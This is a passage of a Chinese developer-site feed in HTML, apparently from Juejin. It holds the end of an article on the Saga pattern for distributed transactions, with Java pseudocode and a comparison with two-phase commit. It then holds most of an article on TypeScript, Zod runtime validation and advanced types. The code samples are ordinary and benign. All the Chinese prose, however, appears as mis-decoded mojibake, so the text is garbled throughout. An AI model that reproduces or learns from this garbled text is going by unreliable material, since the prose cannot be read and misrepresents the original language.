<li>é€»è¾‘é›†ä¸­</li>
</ul>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>æŒ‡æŒ¥å®˜å¯èƒ½å˜èƒ–</li>
</ul>
<blockquote>
<p>ä½†å¯¹ Java åç«¯æ¥è¯´ï¼Œè¿™ä¸ªâ€œèƒ–â€æ˜¯å¯ä»¥æ¥å—çš„ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">æ–¹å¼äºŒï¼šç¼–èˆå¼ Sagaï¼ˆChoreographyï¼‰</h3>
<p>æ²¡æœ‰æŒ‡æŒ¥å®˜ï¼Œå…¨é æœåŠ¡è‡ªå·±â€œçœ‹æ¶ˆæ¯åŠäº‹â€ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
  Order --&gt;|äº‹ä»¶| Payment
  Payment --&gt;|äº‹ä»¶| Inventory
  Inventory --&gt;|å¤±è´¥äº‹ä»¶| Payment
  Payment --&gt;|è¡¥å¿äº‹ä»¶| Order
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>å»ä¸­å¿ƒåŒ–</li>
</ul>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>é“¾è·¯éš¾è¿½è¸ª</li>
<li>Debug é ä¿¡ä»°</li>
</ul>
<blockquote>
<p><strong>ä¸€æ—¦ç³»ç»Ÿå¤§äº†ï¼Œæ²¡äººçŸ¥é“è°åœ¨è·³å“ªæ”¯èˆã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-10">äº”ã€ä¸€ä¸ªä¸‹å•åœºæ™¯çš„ Saga ç¤ºä¾‹ï¼ˆJava æ€è·¯ï¼‰</h2>
<h3 data-id="heading-11">æ­£å‘æµç¨‹</h3>
<ol>
<li>åˆ›å»ºè®¢å•ï¼ˆOrder Serviceï¼‰</li>
<li>æ‰£å‡ä½™é¢ï¼ˆPayment Serviceï¼‰</li>
<li>æ‰£å‡åº“å­˜ï¼ˆInventory Serviceï¼‰</li>
</ol>
<h3 data-id="heading-12">è¡¥å¿æµç¨‹</h3>
<ul>
<li>åº“å­˜å¤±è´¥ â†’ é€€æ¬¾ â†’ å–æ¶ˆè®¢å•</li>
</ul>
<h3 data-id="heading-13">ä¼ªä»£ç ç¤ºä¾‹ï¼ˆç¼–æ’å¼ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrderSaga</span><span class="hljs-params">(CreateOrderCmd cmd)</span> {
    <span class="hljs-keyword">try</span> {
        orderService.create(cmd);
        paymentService.pay(cmd);
        inventoryService.deduct(cmd);
    } <span class="hljs-keyword">catch</span> (Exception e) {
        inventoryService.compensate(cmd);
        paymentService.refund(cmd);
        orderService.cancel(cmd);
        <span class="hljs-keyword">throw</span> e;
    }
}
</code></pre>
<blockquote>
<p>çœ‹èµ·æ¥å¾ˆæ™®é€šï¼Œå¯¹å§ï¼Ÿ</p>
<p><strong>ä½†å®ƒè§£å†³çš„æ˜¯åˆ†å¸ƒå¼äº‹åŠ¡è¿™ä¸ªâ€œä¸–çºªéš¾é¢˜â€ã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-14">å…­ã€Saga çš„å‡ ä¸ªå…³é”®è®¾è®¡ç‚¹ï¼ˆè¡€æ³ªç»éªŒï¼‰</h2>
<h3 data-id="heading-15">1ï¸âƒ£ è¡¥å¿å¿…é¡»æ˜¯å¹‚ç­‰çš„</h3>
<ul>
<li>å¯èƒ½è¢«è°ƒç”¨å¤šæ¬¡</li>
<li>ä¸èƒ½å¤šé€€é’±ã€å¤šåŠ åº“å­˜</li>
</ul>
<blockquote>
<p><strong>å¹‚ç­‰ä¸æ˜¯ä¼˜åŒ–ï¼Œæ˜¯åº•çº¿ã€‚</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-16">2ï¸âƒ£ è¡¥å¿ â‰  å®Œå…¨å›æ»š</h3>
<ul>
<li>æœ‰äº›æ“ä½œä¸å¯é€†ï¼ˆæ¯”å¦‚å‘çŸ­ä¿¡ï¼‰</li>
<li>è¡¥å¿åªèƒ½â€œä¸šåŠ¡ä¸Šå¯¹ç­‰â€</li>
</ul>
<blockquote>
<p>åˆ†å¸ƒå¼ç³»ç»Ÿé‡Œï¼Œ
<strong>æ—¶é—´ä¸èƒ½å€’æµï¼Œåªèƒ½å¯¹å†²ã€‚</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-17">3ï¸âƒ£ ä¸€å®šè¦æœ‰çŠ¶æ€è¡¨</h3>
<ul>
<li>Saga å®ä¾‹çŠ¶æ€</li>
<li>å½“å‰æ‰§è¡Œåˆ°å“ªä¸€æ­¥</li>
<li>æ˜¯å¦å·²è¡¥å¿</li>
</ul>
<p>å¦åˆ™ï¼š</p>
<blockquote>
<p>ç³»ç»Ÿä¸€é‡å¯ï¼Œä½ ä¼šå¤±å¿†ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-18">ä¸ƒã€Saga vs 2PCï¼ˆå¿«é€Ÿå¯¹æ¯”ï¼‰</h2>



































<table><thead><tr><th>ç»´åº¦</th><th>Saga</th><th>2PC</th></tr></thead><tbody><tr><td>ä¸€è‡´æ€§</td><td>æœ€ç»ˆä¸€è‡´</td><td>å¼ºä¸€è‡´</td></tr><tr><td>æ€§èƒ½</td><td>é«˜</td><td>ä½</td></tr><tr><td>å®ç°å¤æ‚åº¦</td><td>ä¸­</td><td>é«˜</td></tr><tr><td>å¯ç”¨æ€§</td><td>é«˜</td><td>ä½</td></tr><tr><td>å¾®æœåŠ¡å‹å¥½åº¦</td><td>â­â­â­â­â­</td><td>â­</td></tr></tbody></table>
<p>ç»“è®ºä¸€å¥è¯ï¼š</p>
<blockquote>
<p><strong>å¾®æœåŠ¡æ—¶ä»£ï¼Œç”¨ Sagaï¼›é“¶è¡Œæ ¸å¿ƒï¼Œç”¨ 2PCã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-19">å…«ã€Java æŠ€æœ¯æ ˆä¸­çš„ Saga å®è·µ</h2>
<p>å¸¸è§ç»„åˆï¼š</p>
<ul>
<li>Spring Boot</li>
<li>Spring Transaction</li>
<li>æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆKafka / RocketMQï¼‰</li>
<li>çŠ¶æ€è¡¨ + å®šæ—¶è¡¥å¿</li>
</ul>
<p>è¿›é˜¶æ¡†æ¶ï¼š</p>
<ul>
<li>Axon</li>
<li>Eventuate Tram</li>
<li>è‡ªç ” Saga Coordinatorï¼ˆå¾ˆå¤šå…¬å¸æœ€ç»ˆéƒ½ä¼šèµ°è¿™æ¡è·¯ï¼‰</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript åœ¨é¡¹ç›®ä¸­çš„å®é™…è§£å†³çš„é—®é¢˜]]></title>    <link>https://juejin.cn/post/7592759140038180905</link>    <guid>https://juejin.cn/post/7592759140038180905</guid>    <pubDate>2026-01-08T09:29:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759140038180905" data-draft-id="7592789801708863529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript åœ¨é¡¹ç›®ä¸­çš„å®é™…è§£å†³çš„é—®é¢˜"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T09:29:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æˆ´ç»´å—"/> <meta itemprop="url" content="https://juejin.cn/user/4336129588332413"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript åœ¨é¡¹ç›®ä¸­çš„å®é™…è§£å†³çš„é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4336129588332413/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æˆ´ç»´å—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:29:32.000Z" title="Thu Jan 08 2026 09:29:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>æ ¸å¿ƒç†å¿µ</strong></p>
<ul>
<li><strong>TypeScript ç±»å‹æ¨æ–­</strong>ï¼šæŠŠè¿è¡Œæ—¶é”™è¯¯å˜æˆç¼–è¯‘æ—¶é”™è¯¯ï¼ŒåŒæ—¶ä¸ºç¼–è¾‘å™¨æä¾›æ™ºèƒ½æç¤ºï¼ˆè‡ªåŠ¨è¡¥å…¨ã€æ‚¬æµ®ç±»å‹ä¿¡æ¯ï¼‰</li>
<li><strong>æ³›å‹çš„æ ¸å¿ƒä»·å€¼</strong>ï¼šè®©ç±»å‹ä¿¡æ¯åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­"æµåŠ¨"ï¼Œè€Œä¸æ˜¯è¢«æŠ¹æ‰</li>
</ul>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆæœ‰äº† TypeScript è¿˜éœ€è¦ Zodï¼Ÿ</h2>
<h3 data-id="heading-1">æœ¬è´¨åŒºåˆ«</h3>

























<table><thead><tr><th/><th>TypeScript</th><th>Zod</th></tr></thead><tbody><tr><td>ä½œç”¨æ—¶æœº</td><td>ç¼–è¯‘æ—¶</td><td>è¿è¡Œæ—¶</td></tr><tr><td>ç¼–è¯‘å</td><td>ç±»å‹ä¿¡æ¯å®Œå…¨æ“¦é™¤</td><td>éªŒè¯é€»è¾‘ä¿ç•™</td></tr><tr><td>ä¿æŠ¤èŒƒå›´</td><td>ä½ å†™çš„ä»£ç </td><td>å¤–éƒ¨è¿›æ¥çš„æ•°æ®</td></tr></tbody></table>
<h3 data-id="heading-2">TypeScript çš„å±€é™</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// ç¼–è¯‘åç±»å‹ä¿¡æ¯å®Œå…¨æ¶ˆå¤±</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(apiResponse); <span class="hljs-comment">// è¿è¡Œæ—¶æ²¡æœ‰ä»»ä½•éªŒè¯ï¼</span>
</code></pre>
<p>å¦‚æœ API è¿”å› <code>{ name: 123, age: "abc" }</code>ï¼ŒTypeScript ä¸ä¼šæŠ¥é”™ï¼Œç¨‹åºä¼šå¸¦ç€é”™è¯¯æ•°æ®ç»§ç»­è¿è¡Œã€‚</p>
<h3 data-id="heading-3">Zod çš„ä»·å€¼</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { z } <span class="hljs-keyword">from</span> <span class="hljs-string">'zod'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>(),
  <span class="hljs-attr">age</span>: z.<span class="hljs-title function_">number</span>(),
});

<span class="hljs-keyword">const</span> user = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(apiResponse)); 
<span class="hljs-comment">// æ•°æ®ä¸ç¬¦åˆ schema ä¼šç›´æ¥æŠ›é”™</span>
</code></pre>
<h3 data-id="heading-4">ä½¿ç”¨åœºæ™¯åˆ¤æ–­</h3>

















<table><thead><tr><th>æ•°æ®æ¥æº</th><th>ç”¨ä»€ä¹ˆ</th></tr></thead><tbody><tr><td>å¤–éƒ¨è¿›æ¥çš„ï¼ˆAPIã€ç”¨æˆ·è¾“å…¥ã€envã€localStorageï¼‰</td><td>Zod</td></tr><tr><td>å†…éƒ¨æµè½¬çš„ï¼ˆpropsã€stateã€å‡½æ•°ç­¾åï¼‰</td><td>TS ç±»å‹</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">äºŒã€Zod çš„æ ¸å¿ƒä¼˜åŠ¿ï¼šSchema å³ç±»å‹</h2>
<h3 data-id="heading-6"><code>z.infer</code> è‡ªåŠ¨å¯¼å‡ºç±»å‹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åªå†™ä¸€æ¬¡ schema</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>(),
  <span class="hljs-attr">email</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">email</span>(),
  <span class="hljs-attr">age</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">min</span>(<span class="hljs-number">0</span>),
});

<span class="hljs-comment">// è‡ªåŠ¨å¯¼å‡º TypeScript ç±»å‹ï¼Œä¸ç”¨æ‰‹å†™ interface</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = z.<span class="hljs-property">infer</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">UserSchema</span>&gt;;
<span class="hljs-comment">// ç­‰ä»·äºï¼štype User = { name: string; email: string; age: number }</span>
</code></pre>
<h3 data-id="heading-7">å¯¹æ¯”ä¼ ç»Ÿæ–¹å¼</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ ä¼ ç»Ÿæ–¹å¼ï¼šå†™ä¸¤éï¼Œå®¹æ˜“ä¸åŒæ­¥</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">validateUser</span>(<span class="hljs-params">data: <span class="hljs-built_in">unknown</span></span>): <span class="hljs-title class_">User</span> {
  <span class="hljs-comment">// æ‰‹å†™éªŒè¯é€»è¾‘...</span>
}

<span class="hljs-comment">// âœ… Zodï¼šSingle Source of Truth</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserSchema</span> = z.<span class="hljs-title function_">object</span>({...});
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = z.<span class="hljs-property">infer</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">UserSchema</span>&gt;;
<span class="hljs-keyword">const</span> user = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">parse</span>(data); <span class="hljs-comment">// éªŒè¯ + ç±»å‹æ¨å¯¼ä¸€æ­¥åˆ°ä½</span>
</code></pre>
<h3 data-id="heading-8">å¥½å¤„</h3>
<ul>
<li><strong>æ”¹ä¸€å¤„ï¼Œå¤„å¤„ç”Ÿæ•ˆ</strong> â€” ä¿®æ”¹ schemaï¼Œç±»å‹è‡ªåŠ¨æ›´æ–°</li>
<li><strong>IDE å…¨ç¨‹æœ‰æç¤º</strong> â€” parse åçš„æ•°æ®æœ‰å®Œæ•´ç±»å‹æ”¯æŒ</li>
<li><strong>å¤æ‚ç±»å‹ä¹Ÿèƒ½æ¨å¯¼</strong> â€” unionã€optionalã€transform ç­‰éƒ½èƒ½æ­£ç¡®æ¨å¯¼</li>
</ul>
<hr/>
<h2 data-id="heading-9">ä¸‰ã€Zod éªŒè¯å¤±è´¥çš„å¤„ç†</h2>
<h3 data-id="heading-10">æ–¹å¼ä¸€ï¼š<code>parse</code> - ç›´æ¥æŠ›é”™</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> user = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">parse</span>(apiResponse);
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-keyword">if</span> (error <span class="hljs-keyword">instanceof</span> z.<span class="hljs-property">ZodError</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error.<span class="hljs-property">errors</span>);
    <span class="hljs-comment">// [{ path: ['email'], message: 'Invalid email' }]</span>
  }
}
</code></pre>
<h3 data-id="heading-11">æ–¹å¼äºŒï¼š<code>safeParse</code> - ä¸æŠ›é”™ï¼ˆæ¨èï¼‰</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> result = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">safeParse</span>(apiResponse);

<span class="hljs-keyword">if</span> (result.<span class="hljs-property">success</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result.<span class="hljs-property">data</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// result.data ç±»å‹å®‰å…¨</span>
} <span class="hljs-keyword">else</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result.<span class="hljs-property">error</span>.<span class="hljs-title function_">flatten</span>()); <span class="hljs-comment">// è¯¦ç»†é”™è¯¯ä¿¡æ¯</span>
}
</code></pre>
<h3 data-id="heading-12">ç†è§£ <code>safeParse</code> è¿”å›å€¼</h3>
<p><code>result</code> æ˜¯ <strong>Zod ç”Ÿæˆçš„ç»“æœå¯¹è±¡</strong>ï¼Œä¸æ˜¯åç«¯æ•°æ®ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// éªŒè¯æˆåŠŸæ—¶</span>
{ <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">data</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> } }

<span class="hljs-comment">// éªŒè¯å¤±è´¥æ—¶</span>
{ <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-title class_">ZodError</span> }
</code></pre>
<h3 data-id="heading-13">å®é™…é¡¹ç›®å¤„ç†æ¨¡å¼</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUser</span>(<span class="hljs-params">id: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">${id}</span>`</span>);
  <span class="hljs-keyword">const</span> json = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();
  
  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">safeParse</span>(json);
  
  <span class="hljs-keyword">if</span> (!result.<span class="hljs-property">success</span>) {
    <span class="hljs-title function_">reportError</span>(<span class="hljs-string">'API schema mismatch'</span>, result.<span class="hljs-property">error</span>); <span class="hljs-comment">// ä¸ŠæŠ¥ç›‘æ§</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// æˆ–è¿”å›é»˜è®¤å€¼ã€æŠ›ä¸šåŠ¡å¼‚å¸¸</span>
  }
  
  <span class="hljs-keyword">return</span> result.<span class="hljs-property">data</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-14">å››ã€TypeScript é«˜çº§ç±»å‹ç³»ç»Ÿ</h2>
<blockquote>
<p>TypeScript çš„ç±»å‹ç³»ç»Ÿæœ¬è´¨ä¸Šæ˜¯ä¸€é—¨<strong>å›¾çµå®Œå¤‡çš„å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€</strong></p>
<p><strong>æ ¸å¿ƒä»·å€¼ï¼šé€šè¿‡ç±»å‹æ¨æ–­ï¼ŒæŠŠè¿è¡Œæ—¶é”™è¯¯å˜æˆç¼–è¯‘æ—¶é”™è¯¯</strong></p>
</blockquote>
<h3 data-id="heading-15">æ³›å‹ï¼šç±»å‹å±‚é¢çš„"å‡½æ•°"</h3>
<blockquote>
<p><strong>æ³›å‹çš„æ ¸å¿ƒä»·å€¼ï¼šè®©ç±»å‹ä¿¡æ¯åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­"æµåŠ¨"ï¼Œè€Œä¸æ˜¯è¢«æŠ¹æ‰</strong></p>
</blockquote>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Wrapper</span>&lt;T&gt; = { <span class="hljs-attr">value</span>: T; <span class="hljs-attr">timestamp</span>: <span class="hljs-built_in">number</span> };

<span class="hljs-keyword">type</span> <span class="hljs-title class_">WrappedString</span> = <span class="hljs-title class_">Wrapper</span>&lt;<span class="hljs-built_in">string</span>&gt;;  <span class="hljs-comment">// { value: string; timestamp: number }</span>
</code></pre>
<h3 data-id="heading-16">æ¡ä»¶ç±»å‹ï¼šç±»å‹å±‚é¢çš„ <code>if-else</code></h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">IsString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-string">"hello"</span>&gt;;  <span class="hljs-comment">// true</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-number">123</span>&gt;;      <span class="hljs-comment">// false</span>
</code></pre>
<h3 data-id="heading-17"><code>infer</code>ï¼šç±»å‹å±‚é¢çš„æ¨¡å¼åŒ¹é…</h3>
<p><code>infer</code> çš„ä½œç”¨ï¼š<strong>"è¿™ä¸ªä½ç½®çš„ç±»å‹æˆ‘ä¸çŸ¥é“ï¼Œä½†å¸®æˆ‘æ•è·å‡ºæ¥ï¼Œåé¢æˆ‘è¦ç”¨"</strong></p>
<p>ç±»æ¯”æ­£åˆ™è¡¨è¾¾å¼çš„æ•è·ç»„ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">æ­£åˆ™ï¼š/<span class="hljs-title class_">Hello</span> (\w+)/  â†’  æ•è·æ‹¬å·é‡ŒåŒ¹é…åˆ°çš„å†…å®¹
ç±»å‹ï¼šT <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt;  â†’  æ•è· <span class="hljs-title class_">Promise</span> é‡Œé¢çš„ç±»å‹
</code></pre>
<h4 data-id="heading-18">ä¸ºä»€ä¹ˆ <code>infer</code> åªèƒ½å’Œ <code>extends</code> ä¸€èµ·ç”¨ï¼Ÿ</h4>
<p><code>infer</code> éœ€è¦ä¸€ä¸ª<strong>åŒ¹é…ä¸Šä¸‹æ–‡</strong>æ‰èƒ½çŸ¥é“è¦æ•è·ä»€ä¹ˆï¼Œ<code>extends</code> æä¾›äº†è¿™ä¸ªä¸Šä¸‹æ–‡ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? U : <span class="hljs-built_in">never</span>
<span class="hljs-comment">//        â†‘ è¿™æ˜¯ä¸€ä¸ª"æ¨¡å¼"</span>
<span class="hljs-comment">//                  â†‘ åœ¨è¿™ä¸ªæ¨¡å¼é‡Œï¼ŒU æ˜¯è¦æ•è·çš„éƒ¨åˆ†</span>
</code></pre>
